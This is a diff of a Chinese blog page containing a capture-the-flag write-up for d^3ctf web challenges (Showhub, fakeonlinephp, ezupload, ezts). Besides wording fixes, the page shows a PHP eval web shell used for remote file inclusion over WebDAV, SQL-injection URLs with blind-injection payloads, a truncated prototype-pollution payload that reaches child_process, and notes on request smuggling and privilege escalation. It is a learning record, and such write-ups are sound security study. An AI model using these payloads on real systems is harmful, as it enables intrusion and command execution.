@@ -50,7 +50,7 @@
 <meta property="og:image" content="https://i.loli.net/2019/11/27/l3hdoCLcsYvGqrU.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/27/4e2nM9P8QAtsRjU.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/27/2xOCqmYKzutWy4d.png">
-<meta property="og:updated_time" content="2019-11-27T04:37:13.961Z">
+<meta property="og:updated_time" content="2019-11-28T00:25:26.948Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="d^3ctf-web">
 <meta name="twitter:image" content="https://i.loli.net/2019/11/26/kKqbvXgzCaMj2D6.png">
@@ -267,13 +267,18 @@
 <p>本地简单测试一下，很成功</p>
 <p><img src="https://i.loli.net/2019/11/26/M7XhCpt1K3wOBxV.png" alt="Snipaste_2019-11-26_14-56-48.png"></p>
 <p>这里注册完直接就登录进去了。。。应该是根据注册时的用户名把</p>
-<p>不知道为啥退出再登录失败。。。</p>
+<p>不知道为啥退出再登录会失败。。。</p>
 <p>下一步是利用<code>HTTP请求走私攻击</code></p>
 <blockquote>
 <p>参考链接： <a href="https://mengsec.com/2019/10/10/http-request-smugging/" target="_blank" rel="noopener">https://mengsec.com/2019/10/10/http-request-smugging/</a> </p>
 </blockquote>
 <p><code>CL-TE</code></p>
 <p>可能由于我上一步不是直接登录的，导致也没成功</p>
+<p>===========================</p>
+<p>失败的原因可能是发的次数不够多，下次用bp的<code>intruder</code>发包</p>
+<blockquote>
+<p>这题的检测应该是在中间代理ATS服务器，通过检测才将请求转发给后端服务器。所以我们登陆admin后，直接访问<code>/WebConsole</code>是无法通过中间代理的检测的。但是因为检测是中间代理，后端服务器是无条件相信中间代理转发的包的，所以我们可以通过走私的方式将想要的数据包通过代理转发给后端服务器。 </p>
+</blockquote>
 <h3 id="fakeonlinephp"><a href="#fakeonlinephp" class="headerlink" title="fakeonlinephp"></a>fakeonlinephp</h3><p><img src="https://i.loli.net/2019/11/26/y97qzOjZBger2nT.png" alt="Snipaste_2019-11-26_16-12-55.png"></p>
 <p>开始以为是原题，发现环境经常会404。。。应该就是为了防止用原解</p>
 <blockquote>
@@ -281,7 +286,7 @@
 </blockquote>
 <p>这里是<code>windows系统</code>，</p>
 <blockquote>
-<p>正常情况下无法远程包含，但是因为是windows，可以绕过<strong>allow_url_include</strong>的限制<strong>RFI</strong>，参考：  <a href="https://byqiyou.github.io/2019/05/15/bypass-RFI限制的一些思路/" target="_blank" rel="noopener">https://byqiyou.github.io/2019/05/15/bypass-RFI%E9%99%90%E5%88%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/</a> </p>
+<p>正常情况下无法远程包含，但是因为是windows，可以绕过<code>allow_url_include</code>的限制<code>RFI</code>，参考：  <a href="https://byqiyou.github.io/2019/05/15/bypass-RFI限制的一些思路/" target="_blank" rel="noopener">https://byqiyou.github.io/2019/05/15/bypass-RFI%E9%99%90%E5%88%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/</a> </p>
 </blockquote>
 <p>首先启用<code>WebDAV</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v ~/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav</span><br></pre></td></tr></table></figure>
@@ -298,7 +303,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@&lt;?php</span><br><span class="line">	phpinfo();</span><br><span class="line">    @eval(($_POST)&#123;cmd&#125;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>成功，用蚁剑连</p>
-<p>但是立马的文件内容是乱码。。。</p>
+<p>但是里面的文件内容是乱码。。。</p>
 <p><img src="https://i.loli.net/2019/11/26/uIWkiTpn4RDHYs1.png" alt="Snipaste_2019-11-26_16-41-08.png"></p>
 <p>修改下编码器成功</p>
 <p>这里再回去看看<code>phpinfo()</code>，正好前天学习看文章嫖了个工具😁</p>
@@ -359,15 +364,14 @@
 <p>再开启下扩展</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LoadModule rewrite_module modules/mod_rewrite.so</span><br><span class="line">AllowOverride All</span><br></pre></td></tr></table></figure>
 
-<p>突然发现事情并不简单😱。。。为啥之前<code>__destruct()</code>写入的文件不存在。。</p>
+<p>突然发现事情并不简单😱。。。为啥之前<code>__destruct()</code>写入的文件不存在。。<code>error_log</code>看一下提示没有权限。。。但是同样的权限<code>.htaccess</code>成功创建</p>
 <p>这其实算是一个提示把，本地测一下<code>__destruct()</code>的当前路径</p>
 <p><img src="https://i.loli.net/2019/11/27/TNi5XDZfraV6Rmb.png" alt="Snipaste_2019-11-27_09-54-36.png"></p>
 <p><img src="https://i.loli.net/2019/11/27/6kdWOJgIhsQ285x.png" alt="Snipaste_2019-11-27_09-53-57.png"></p>
 <p>发现在根目录，那么这里要写入的话可以通过触发反序列化来写入，正好之前的<code>phar://</code>没有被<code>ban</code></p>
-<p>并且<code>phar</code>是可以<code>gzip</code>压缩的</p>
-<p>还需要解决<code>__destruct()</code>中写入文件的绝对路径的问题，列目录有两种方法</p>
-<p>第一种比较方便，利用<code>glob://</code>协议，当时不知道在那个群看过一眼。。。不会用🤦‍♂️</p>
-<p>第二种利用<code>__toString()</code></p>
+<p>并且<code>phar</code>是可以<code>gzip</code>压缩的，从而绕过对某些字符的检查</p>
+<p>那么还需要解决<code>__destruct()</code>中写入文件的绝对路径的问题，列目录</p>
+<p>利用<code>__toString()</code></p>
 <p><img src="https://i.loli.net/2019/11/27/YaWvmLp3OUBqtJ6.png" alt="Snipaste_2019-11-27_10-36-03.png"></p>
 <p>举个例子</p>
 <p><img src="https://i.loli.net/2019/11/27/RguSfOekB6i4rQL.png" alt="Snipaste_2019-11-27_10-37-02.png"></p>
@@ -393,8 +397,26 @@
 <p><strong>.htaccess的其他写法<code>AddHandler php7-script .txt</code></strong></p>
 <p><strong>__destruct()的路径为根目录</strong></p>
 <p><strong>phar压缩(⽤gzip)绕过字符检测</strong></p>
-<p><strong><code>glob</code>。。。。</strong></p>
+<p><strong><code>glob://</code>也可以用来绕过open_basedir。。。。</strong></p>
 <h3 id><a href="#" class="headerlink" title></a></h3><h3 id="ezts"><a href="#ezts" class="headerlink" title="ezts"></a>ezts</h3><p>======未完待续</p>
+<p>卧槽，，环境关了。。那么记录下思路</p>
+<blockquote>
+<p>KOA框架<a href="https://github.com/koajs/koa" target="_blank" rel="noopener">https://github.com/koajs/koa</a><br><a href="https://github.com/d-band/koa-orm" target="_blank" rel="noopener">https://github.com/d-band/koa-orm</a></p>
+</blockquote>
+<p>我感觉之后wp这个应该是<code>fuzz</code>出来的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://df8aea7e00.ezts.d3ctf.io/search?key=1&apos;))%20or%20((%271&amp;value=1</span><br><span class="line">http://df8aea7e00.ezts.d3ctf.io/search?key=1&apos;))%20or%201%23&amp;value=1</span><br><span class="line">http://df8aea7e00.ezts.d3ctf.io/search?key=1&apos;))%20or%20(ascii(substr((select%20version()),1,1))%3E10)%23&amp;value=1</span><br></pre></td></tr></table></figure>
+
+<p>盲注脚本出admin账号密码</p>
+<p>原型链污染</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a; return global.process.mainModule.constructor._load(&apos;child_process&apos;).execS...</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>/flag 是root 400权限, 现在是node⽤⼾,</p>
+</blockquote>
+<p>还需要提权一下</p>
+<blockquote>
+<p>CVE-2019-14287</p>
+</blockquote>
 <h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h4><p>NU1L知识星球分享的wp</p>
 <p> <a href="https://nikoeurus.github.io/2019/11/26/D^3ctf-Web/#ezupload" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/11/26/D%5E3ctf-Web/#ezupload</a> </p>
 
@@ -552,6 +574,19 @@
             </div>
         </div>
         
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#easyweb"><span class="toc-number">1.</span> <span class="toc-text">easyweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Showhub"><span class="toc-number">2.</span> <span class="toc-text">Showhub</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fakeonlinephp"><span class="toc-number">3.</span> <span class="toc-text">fakeonlinephp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezupload"><span class="toc-number">4.</span> <span class="toc-text">ezupload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">5.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezts"><span class="toc-number">6.</span> <span class="toc-text">ezts</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#参考链接"><span class="toc-number">6.1.</span> <span class="toc-text">参考链接:</span></a></li></ol></li></ol>
+                    </div>
+                </span>
+            </div>
+        </div>
         
     </div>
 </aside>
